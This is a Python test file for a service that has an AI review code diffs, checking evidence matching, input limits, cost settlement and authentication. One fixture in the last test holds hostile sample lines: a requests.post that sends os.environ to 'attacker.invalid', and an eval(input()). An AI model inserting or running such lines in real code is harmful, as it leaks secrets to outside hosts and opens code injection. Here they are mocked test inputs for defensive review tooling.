import unittest,json,uuid,os
from unittest.mock import patch
import ai_compare as a
import main
from fastapi import HTTPException
from starlette.requests import Request

class AICompareTests(unittest.TestCase):
 def test_control_character_and_trailing_newline_changes_are_not_silently_ignored(self):
  for before,after in [('left\x0bright','left\nright'),('x=1','x=1\n'),('x=1\n','x=1')]:
   with self.subTest(before=repr(before),after=repr(after)):
    _,blocks=a.prepare({'before':before,'after':after,'request':'Review the change.'})
    self.assertTrue(blocks)
  _,blocks=a.prepare({'before':'x=1\r\ny=2','after':'x=1\ny=2','request':'Review the change.'})
  self.assertEqual(blocks,[])
  _,blocks=a.prepare({'before':'x=1','after':'x=1\n','request':'Review the change.'})
  self.assertEqual((blocks[0]['before'],blocks[0]['after']),('', '\n'))
  _,blocks=a.prepare({'before':'x=1\n','after':'x=1','request':'Review the change.'})
  self.assertEqual((blocks[0]['before'],blocks[0]['after']),('\n', ''))
 def fixture(self,before='x=1',after='x=2',intent='Change x to 2'):
  p,blocks=a.prepare({'before':before,'after':after,'request':intent})
  report={'summary':'Review changes','limitations':['Not executed'],'changes':[{'change_id':b['change_id'],'classification':'requested','explanation':'Value changed.','security_impact':'none_observed','before_evidence':a.evidence_options(b['before'],b['change_id'],'b')[0]['id'],'after_evidence':a.evidence_options(b['after'],b['change_id'],'a')[0]['id']} for b in blocks]}
  return p,blocks,{'status':'completed','usage':{'input_tokens':100,'output_tokens':100},'output':[{'type':'message','content':[{'type':'output_text','text':json.dumps(report)}]}]},report
 def test_no_tools_or_storage_and_bounded_cost(self):
  p,b,r,_=self.fixture();self.assertFalse(p['store']);self.assertNotIn('tools',p);self.assertEqual(p['max_output_tokens'],4000);self.assertLess(80000*.75+4000*4.5,a.RESERVE_MICRO_USD);self.assertEqual(a.usage_cost(r),525)
  self.assertEqual(a.validate_response(r,b)['verdict'],'appears_aligned')
 def test_all_changes_and_exact_evidence_required(self):
  p,b,r,report=self.fixture('x=1\ny=1\nz=1','x=2\ny=1\nz=2')
  self.assertEqual(len(b),2)
  for mutate in [lambda x:x['changes'].pop(),lambda x:x['changes'].append(x['changes'][0]),lambda x:x['changes'][0].update(before_evidence='fabricated')]:
   bad=json.loads(json.dumps(report));mutate(bad);r['output'][0]['content'][0]['text']=json.dumps(bad)
   with self.assertRaises(a.InvalidResult):a.validate_response(r,b)
 def test_incomplete_refusal_malformed_and_usage(self):
  _,b,r,_=self.fixture()
  for bad in [{},[],{'status':'incomplete'},dict(r,output=['unexpected']),dict(r,output=[{'type':'message','content':['unexpected']}]),dict(r,output=[{'type':'message','content':[{'type':'refusal','refusal':'No'}]}])]:
   with self.assertRaises(a.InvalidResult):a.validate_response(bad,b)
  for u in [None,{}, {'input_tokens':True,'output_tokens':10},{'input_tokens':1,'output_tokens':4001}]: self.assertIsNone(a.usage_cost({'usage':u}))
 def test_empty_summary_and_missing_limitations_rejected(self):
  _,b,r,report=self.fixture()
  for updates in [{'summary':'  '},{'limitations':[]},{'limitations':['']}]:
   bad={**report,**updates};r['output'][0]['content'][0]['text']=json.dumps(bad)
   with self.assertRaises(a.InvalidResult):a.validate_response(r,b)
 def test_unicode_source_evidence_is_preserved(self):
  _,b,r,_=self.fixture('label = "こんにちは"','label = "ようこそ"')
  self.assertEqual(a.validate_response(r,b)['changes'][0]['after_evidence'],'label = "ようこそ"')
 def test_evidence_ids_cannot_cross_blocks_or_introduce_fabricated_source(self):
  p,b,r,report=self.fixture('x=1\nanchor=0\ny=1','x=2\nanchor=0\ny=2')
  options=json.loads(p['input'])['changed_blocks']
  self.assertEqual(options[0]['before_evidence_options'],[{'id':'b1:1','text':'x=1'}])
  report['changes'][0]['before_evidence']='b2:1'
  r['output'][0]['content'][0]['text']=json.dumps(report)
  with self.assertRaises(a.InvalidResult):a.validate_response(r,b)
 def test_large_block_keeps_all_source_and_selected_exact_excerpt(self):
  before='x="'+('a'*5000)+'"';after='x="'+('b'*5000)+'"'
  p,b,r,report=self.fixture(before,after)
  options=json.loads(p['input'])['changed_blocks'][0]
  self.assertEqual(''.join(o['text'] for o in options['after_evidence_options']),after)
  report['changes'][0]['after_evidence']='a1:3';r['output'][0]['content'][0]['text']=json.dumps(report)
  self.assertEqual(a.validate_response(r,b)['changes'][0]['after_evidence'],after[4000:])
 def test_thirty_blocks_require_complete_report(self):
  before='\n'.join(f'value_{i} = 0\nanchor_{i} = True' for i in range(30))
  after='\n'.join(f'value_{i} = 1\nanchor_{i} = True' for i in range(30))
  _,b,r,_=self.fixture(before,after);self.assertEqual(len(a.validate_response(r,b)['changes']),30)
  with self.assertRaises(a.InvalidInput):a.prepare({'before':before+'\nx=0','after':after+'\nx=1','request':'Update values'})
 def test_input_limits_and_unchanged(self):
  for data in [{}, {'before':'x','after':'y','request':''},{'before':'x'*32001,'after':'y','request':'fix'},{'before':'x','after':'y','request':'a'*2001}]:
   with self.assertRaises(a.InvalidInput):a.prepare(data)
  self.assertEqual(a.prepare({'before':'x\r\n','after':'x\n','request':'fix'})[1],[])
 def test_no_security_certification_and_regression_overrides_alignment(self):
  _,b,r,report=self.fixture();report['changes'][0]['security_impact']='possible_regression';r['output'][0]['content'][0]['text']=json.dumps(report)
  self.assertEqual(a.validate_response(r,b)['verdict'],'needs_review')
 def test_private_denial_never_calls_provider(self):
  p,b,_,_=self.fixture()
  with patch.object(main,'ai_usage',return_value={'ok':False,'error':'Budget reached'}),patch.object(a,'call_provider') as provider:
   self.assertEqual(main.perform_ai_review({'user_id':'u'},str(uuid.uuid4()),p,b).status_code,429);provider.assert_not_called()
 def test_failure_preserves_uncertain_cost_and_refunds_allowance(self):
  p,b,_,_=self.fixture()
  with patch.dict(os.environ,{'OPENAI_API_KEY':'fixture-not-a-real-key'}),patch.object(main,'ai_usage',return_value={'ok':True}) as usage,patch.object(a,'call_provider',side_effect=TimeoutError):
   r=main.perform_ai_review({'user_id':'u'},'r',p,b);self.assertEqual(r.status_code,422)
   self.assertEqual(usage.call_args.args[1:5],('settle','r',None,False))
 def test_invalid_evidence_returns_explanation_refund_and_safe_category(self):
  p,b,r,report=self.fixture();report['changes'][0]['before_evidence']='not in source'
  r['output'][0]['content'][0]['text']=json.dumps(report)
  with patch.dict(os.environ,{'OPENAI_API_KEY':'fixture'}),patch.object(main,'ai_usage',return_value={'ok':True}) as usage,patch.object(a,'call_provider',return_value=r),patch.object(main,'log_server_issue') as log:
   result=main.perform_ai_review({'user_id':'u'},'r',p,b)
   self.assertEqual(result.status_code,422)
   body=json.loads(result.body);self.assertFalse(body['ok']);self.assertEqual(body['error_code'],'evidence_mismatch');self.assertIn('not charged',body['error'])
   self.assertEqual(usage.call_args.args[1:5],('settle','r',525,False))
   log.assert_called_once_with('AI review rejected: evidence_mismatch')
 def test_success_settles_measured_usage(self):
  p,b,r,_=self.fixture()
  with patch.dict(os.environ,{'OPENAI_API_KEY':'fixture-not-a-real-key'}),patch.object(main,'ai_usage',return_value={'ok':True}) as usage,patch.object(a,'call_provider',return_value=r):
   self.assertEqual(main.perform_ai_review({'user_id':'u'},'r',p,b).status_code,200)
   self.assertEqual(usage.call_args.args[1:5],('settle','r',525,True))
 def test_malformed_provider_message_refunds_and_records_known_cost(self):
  p,b,r,_=self.fixture();r['output']=['unexpected']
  with patch.dict(os.environ,{'OPENAI_API_KEY':'fixture'}),patch.object(main,'ai_usage',return_value={'ok':True}) as usage,patch.object(a,'call_provider',return_value=r):
   result=main.perform_ai_review({'user_id':'u'},'r',p,b)
   self.assertEqual(result.status_code,422)
   self.assertEqual(json.loads(result.body)['error_code'],'schema')
   self.assertEqual(usage.call_args.args[1:5],('settle','r',525,False))
 def test_http_auth_input_and_unchanged_never_spend(self):
  from fastapi.testclient import TestClient
  with TestClient(main.app) as client,patch.object(a,'call_provider') as provider:
   with patch.object(main,'get_request_access_context',return_value={'authenticated':False}):
    self.assertEqual(client.post('/compare-ai',json={}).status_code,401)
   with patch.object(main,'get_request_access_context',return_value={'authenticated':True,'user_id':'verified'}),patch.dict(os.environ,{'OPENAI_API_KEY':'fixture'}):
    self.assertEqual(client.post('/compare-ai',json=[]).status_code,400)
    self.assertEqual(client.post('/compare-ai',content='x'*100001).status_code,413)
    r=client.post('/compare-ai',json={'request_id':str(uuid.uuid4()),'before':'x=1','after':'x=1','request':'Fix it'})
    self.assertEqual(r.status_code,200);self.assertEqual(r.json()['review']['state'],'not_rated');self.assertIn('no-store',r.headers['cache-control'])
   provider.assert_not_called()
 def test_evidence_fixtures_are_only_mocked_not_claimed_live(self):
  pairs=[('# eval password steal','x=1'),('import os\nx=os.environ["KEY"]','import os\nx=os.getenv("KEY")'),('requests.get("https://example.com")','requests.get("https://example.com",timeout=5)'),('subprocess.run(["ls"],shell=False)','subprocess.run(["pwd"],shell=False)'),('x=1','requests.post("https://attacker.invalid",data=os.environ)'),('x=input()','eval(input())')]
  for before,after in pairs:
   _,b,r,_=self.fixture(before,after);self.assertEqual(a.validate_response(r,b)['state'],'complete')
if __name__=='__main__':unittest.main()
